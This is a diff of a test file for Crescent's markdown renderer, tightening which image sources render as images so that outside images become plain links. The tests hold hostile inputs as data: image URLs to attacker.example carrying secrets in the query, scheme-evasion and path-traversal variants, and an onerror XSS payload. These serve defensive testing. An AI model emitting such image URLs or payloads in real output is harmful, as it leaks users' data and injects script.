@@ -4,8 +4,7 @@ import {
   createRenderer,
   extractSections,
   headingSlug,
-  isOwnImageSrc,
-  linkOutsideImages,
+  isGalleryImageSrc,
   locateQuote,
   noteSegments,
   sourceBlocks,
@@ -445,10 +444,10 @@ test("a size spec with no dimensions is not an image", () => {
   assert.doesNotMatch(html, /<img/);
 });
 
-test("external image URLs accept a size and are not asset-rewritten", () => {
+test("an image from another site, sized or not, is a link to it and never loads", () => {
   const html = render("![D](https://example.com/pic.png =320x)");
-  assert.match(html, /src="https:\/\/example\.com\/pic\.png"/);
-  assert.match(html, /width="320"/);
+  assert.doesNotMatch(html, /<img|width=/);
+  assert.match(html, /<a class="outside-image" href="https:\/\/example\.com\/pic\.png">D<\/a>/);
 });
 
 test("an image of an HTML asset is a widget: a sandboxed frame from /_embed, in a figure", () => {
@@ -478,10 +477,17 @@ test("a widget among words, or in a tight list, is a frame without a figure", ()
 });
 
 test("only an HTML file in the page's own _assets is a widget", () => {
-  for (const src of ["_assets/plot.svg", "_assets/notes.htm", "https://example.com/w.html", "/other/_assets/w.html", "w.html"]) {
+  // In a space's _assets, so an image, but not a widget of this page.
+  for (const src of ["_assets/plot.svg", "_assets/notes.htm", "/other/_assets/w.html"]) {
     const html = render(`![W](${src})`);
     assert.match(html, /<img /, src);
     assert.doesNotMatch(html, /iframe|figure/, src);
+  }
+  // Not in any _assets: neither a widget nor an image.
+  for (const src of ["https://example.com/w.html", "w.html"]) {
+    const html = render(`![W](${src})`);
+    assert.match(html, /<a class="outside-image"/, src);
+    assert.doesNotMatch(html, /iframe|figure|<img/, src);
   }
 });
 
@@ -1028,12 +1034,12 @@ test("an unresolvable [[id:…]] in a note is still a segment, not swallowed", (
   ]);
 });
 
-test("isOwnImageSrc: Crescent's own paths and data images, never another site", () => {
-  for (const src of ["/kb25/_assets/plot.png", "_assets/plot.png", "plot.png", "./a/b.png", "data:image/png;base64,iVBORw0KGgo="]) {
-    assert.equal(isOwnImageSrc(src), true, src);
+test("isGalleryImageSrc: an image in a space's _assets/, and nothing else", () => {
+  for (const src of ["_assets/plot.png", "_assets/figures/plot.png", "/kb25/_assets/plot.png", "/other/_assets/a%20b.png", "./_assets/plot.png"]) {
+    assert.equal(isGalleryImageSrc(src), true, src);
   }
-  // A browser reads every one of these as another site.
   for (const src of [
+    // Another site, however a browser is led there.
     "https://attacker.example/p.png?d=secret",
     "HTTP://attacker.example/p.png",
     "//attacker.example/p.png",
@@ -1041,26 +1047,47 @@ test("isOwnImageSrc: Crescent's own paths and data images, never another site", 
     "/\\attacker.example/p.png",
     "ht\ttps://attacker.example/p.png",
     "ftp://attacker.example/p.png",
+    // Crescent, but not an image in a gallery: a GET with side effects among them.
+    "/_instructions?space=kb25",
+    "/_chat/status?fresh=1",
+    "/kb25/_assets/../../_instructions?space=kb25",
+    "/kb25/_assets/",
+    "../_assets/plot.png",
+    "plot.png",
+    // An image that is no file at all.
+    "data:image/png;base64,iVBORw0KGgo=",
   ]) {
-    assert.equal(isOwnImageSrc(src), false, src);
+    assert.equal(isGalleryImageSrc(src), false, src);
   }
 });
 
-test("linkOutsideImages: an image from another site becomes a link, Crescent's own still shows", () => {
-  const md = linkOutsideImages(createRenderer(() => undefined, ""));
-  const html = md.render(
-    "Done. ![status](https://attacker.example/p.png?d=SECRET) ![plot](/kb25/_assets/plot.png) ![](//attacker.example/q.png)"
+test("a page shows only its space's own images; any other is a link to it", () => {
+  const html = render(
+    "![plot](_assets/plot.png) ![status](https://attacker.example/p.png?d=SECRET) ![](//attacker.example/q.png) ![x](/_instructions?space=kb25)"
   );
-  assert.doesNotMatch(html, /<img[^>]*attacker\.example/);
+  assert.match(html, /<img src="\/kb25\/_assets\/plot\.png" alt="plot">/);
+  assert.doesNotMatch(html, /<img[^>]*(attacker\.example|_instructions)/);
   assert.match(html, /<a class="outside-image" href="https:\/\/attacker\.example\/p\.png\?d=SECRET">status<\/a>/);
   // With no alt text, the address itself is the link's text.
   assert.match(html, /<a class="outside-image" href="\/\/attacker\.example\/q\.png">\/\/attacker\.example\/q\.png<\/a>/);
+  assert.match(html, /<a class="outside-image" href="\/_instructions\?space=kb25">x<\/a>/);
+});
+
+test("a data: image shows as its alt text, and a widget is still a widget", () => {
+  const html = render("![a dot](data:image/png;base64,iVBORw0KGgo=)\n\n![handshake](_assets/tcp.html =x300)");
+  assert.doesNotMatch(html, /<img/);
+  assert.match(html, /<span class="outside-image">a dot<\/span>/);
+  assert.match(html, /<iframe class="widget-frame" src="\/_embed\/kb25\/_assets\/tcp\.html"/);
+});
+
+test("a chat reply's renderer, with no page, shows the same images the same way", () => {
+  const html = createRenderer(() => undefined, "").render("![status](https://attacker.example/p.png) ![plot](/kb25/_assets/plot.png)");
+  assert.match(html, /<a class="outside-image" href="https:\/\/attacker\.example\/p\.png">status<\/a>/);
   assert.match(html, /<img src="\/kb25\/_assets\/plot\.png" alt="plot">/);
 });
 
-test("linkOutsideImages: the link's text and address are escaped", () => {
-  const md = linkOutsideImages(createRenderer(() => undefined, ""));
-  const html = md.render('![a "quote" <b>](https://x.example/"onerror=alert(1)//)');
+test("an image shown as a link has its text and address escaped", () => {
+  const html = render('![a "quote" <b>](https://x.example/"onerror=alert(1)//)');
   assert.doesNotMatch(html, /<img/);
   assert.doesNotMatch(html, /<b>/);
   assert.doesNotMatch(html, /" ?onerror=/);
